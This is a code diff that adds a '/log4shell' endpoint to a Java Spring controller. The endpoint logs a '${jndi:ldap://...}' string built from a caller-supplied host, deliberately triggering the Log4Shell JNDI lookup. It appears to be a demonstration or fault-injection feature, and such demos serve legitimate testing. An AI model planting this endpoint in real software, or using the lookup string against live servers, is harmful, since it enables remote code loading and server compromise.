@@ -130,4 +130,10 @@ public class WebController {
         sw.stop();
         return result;
     }
+
+    @GetMapping(path = "/log4shell")
+    public void stackOverFlow(@RequestParam String url) {
+        log.info("Causing log4shell bug against {}", url);
+        log.error("${jndi:ldap://" + url + "}");
+    }
 }
